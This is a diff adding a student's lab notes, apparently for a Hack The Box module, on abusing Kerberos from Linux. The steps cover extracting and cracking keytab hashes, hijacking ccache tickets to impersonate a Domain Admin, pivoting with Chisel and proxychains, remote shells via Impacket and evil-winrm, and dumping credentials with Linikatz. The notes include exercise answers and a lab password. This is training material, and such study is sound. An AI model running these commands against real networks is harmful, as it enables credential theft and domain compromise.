@@ -2823,3 +2823,250 @@ smbclient //dc01/carlos -k -c ls
 >[!Note]
 >`-k` uses the Kerberos auth insteadof user/pass
 >
+### KeyTab Extract
+
+The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.
+
+We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
+
+#### Extracting KeyTab hashes with KeyTabExtract
+
+```shell
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+---
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+
+With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
+
+The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.
+#### Log in as Carlos
+
+```shell
+su - carlos@inlanefreight.htb
+# Enter the cracked passswd
+```
+### Obtaining more hashes
+
+Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.
+
+## Abusing KeyTab ccache
+
+To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.
+
+Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.
+
+#### Privilege escalation to root
+
+```shell
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+```
+
+As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
+#### Looking for ccache files
+
+```shell
+ls -la /tmp
+```
+
+There is one user ([julio@inlanefreight.htb](mailto:julio@inlanefreight.htb)) to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`.
+Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.
+
+To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
+
+```shell
+root@linux01:~# klist: No credentials cache found (filename: /tmp/krb5cc_0)
+root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
+root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+root@linux01:~# klist
+Ticket cache: FILE:/root/krb5cc_647401106_I8I133
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/08/2022 13:25:01
+root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
+  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
+  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
+  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
+  john                                D        0  Mon Jul 18 13:19:50 2022
+  julio                               D        0  Mon Jul 18 13:54:02 2022
+  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
+  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
+  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
+  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
+  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
+  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
+  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
+  tools                               D        0  Thu Sep 22 18:19:04 2022
+  Users                              DR        0  Thu Oct  6 11:46:05 2022
+  Windows                             D        0  Wed Oct  5 13:20:00 2022
+
+                7706623 blocks of size 4096. 4447612 blocks available
+```
+
+>[!Note]
+>klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+## Using Linux attack tools with Kerberos
+
+Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
+
+In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.
+#### Host file modified
+
+```shell
+cat /etc/hosts
+```
+
+We need to modify our proxychains configuration file to use socks5 and port 1080.
+#### Proxychains configuration file
+
+```shell
+cat /etc/proxychains.conf
+---
+socks5 127.0.0.1 1080
+```
+
+We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.
+#### Download Chisel to our attack host
+
+```shell
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse
+```
+
+Connect to `MS01` via RDP and execute chisel (located in C:\Tools).
+#### Connect to MS01 with xfreerdp
+
+```shell
+xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+```
+#### Execute chisel from MS01
+
+```powershell
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+```
+
+>[!Note]
+>The client IP is your attack host IP.
+
+Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
+#### Setting the KRB5CCNAME environment variable
+
+```shell
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+### Impacket
+
+To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.
+#### Using Impacket with proxychains and Kerberos authentication
+
+```shell
+proxychains impacket-wmiexec dc01 -k
+```
+
+>[!Note]
+>If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+### Evil-WinRM
+
+To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.
+#### Installing Kerberos authentication package
+
+```shell
+sudo apt-get install krb5-user -y
+```
+#### Default Kerberos v5 realm
+
+![Kerberos authentication configuration screen showing default realm as INLANEFREIGHT.HTB.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/kerberos-realm.jpg)
+
+The Kerberos servers can be empty.
+#### Administrative server for your Kerberos realm
+
+![Kerberos authentication configuration screen with administrative server set to DC01 for INLANEFREIGHT.HTB realm.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/kerberos-server-dc01.jpg)
+
+In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
+#### Kerberos configuration file for INLANEFREIGHT.HTB
+
+```shell
+cat /etc/krb5.conf
+```
+Now we can use evil-winrm.
+#### Using Evil-WinRM with Kerberos
+
+```shell
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+## Miscellaneous
+
+If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+#### Impacket Ticket converter
+
+```shell
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.
+#### Importing converted ticket into Windows session with Rubeus
+
+```shell
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+## Linikatz
+
+[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.
+
+Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
+#### Linikatz download and execution
+
+```shell
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+```
+## Exercise
+
+### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
+### Which group can connect to LINUX01?
+
+```shell
+real list
+```
+### Look for a keytab file that you have read and write access. Submit the file name as a response.
+
+```shell
+find / -name *keytab* 2>/dev/null
+```
+carlos.keytab
+### Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
+
+```shell
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+su carlos@inlanefreight.htb
+```
+### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
+
+```shell
+ssh svc_workstations@inlanefreight.htb@10.129.205.39 -p 2222
+-- 
+Password4
+```
+
+>[!Important]
+>I didn’t document every step, but there were multiple ways to extract the hashes. I copied the `.kt` file — which my current user had read permissions on — to `/tmp/`, then switched back to the `david` user and used the existing script in his profile to extract the hashes
+### Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
+
+```shell
+sudo -l
+sudo su
+```
+### Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.
